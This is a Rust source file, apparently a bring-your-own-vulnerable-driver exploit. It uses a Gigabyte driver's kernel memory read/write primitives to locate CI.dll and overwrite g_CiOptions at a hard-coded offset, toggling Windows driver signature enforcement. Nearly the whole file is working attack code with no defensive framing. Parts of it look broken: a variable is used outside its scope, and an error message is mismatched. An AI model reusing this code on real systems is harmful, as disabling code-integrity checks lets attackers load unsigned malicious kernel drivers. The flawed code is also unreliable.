#![allow(clippy::let_and_return)]
pub mod gdrv3_ioctls;
pub mod util;

use std::error::Error;

use crate::gdrv3_ioctls::*;
use crate::util::*;
use std::io::prelude::*;


#[allow(unused_imports)]
use crate::util::*;

const G_CIOPTIONS_OFFSET: u64 = 0x393b8;

fn main() -> Result<(), Box <dyn Error>> {
    let gb_driver = GigabyteDriver::new()?;
    println!("Opened a handle to the gigabyte device");
    

    let ntoskrnl_base = get_driver_base("ntoskrnl.exe").expect("Could not find ci.dll");
    let process = gb_driver.get_eprocess_by_pid(4).expect("Could not find pid");
    let cr3 = gb_driver.get_cr3_value_eprocess(process);
    let physical_address = gb_driver.virt_to_physical(cr3, ntoskrnl_base + 0x3ad6f1);

    let ci_base = get_driver_base("CI.dll").expect("Could not find ci.dll");

    println!("ci_base -> {ci_base:#x}");

    let g_ci_options = gb_driver.read_bytes(ci_base + G_CIOPTIONS_OFFSET, 4);
    let g_ci_options = u32::from_le_bytes(g_ci_options.try_into().unwrap());

    if g_ci_options == 0 {
        println!("Reenabling signing");
        gb_driver.write_bytes(ci_base + G_CIOPTIONS_OFFSET, &[0x16, 0, 0, 0u8]);

        let bytes = gb_driver.read_phys_mem(physical_address, 2);
    }
    else {
        println!("Disabling signing");
        gb_driver.write_bytes(ci_base + G_CIOPTIONS_OFFSET, &[0x0, 0, 0, 0u8]);
    }

    println!("g_ci_options -> {:#x}", g_ci_options);


    println!("bytes -> {:#x?}", bytes);
    

    Ok(())
}
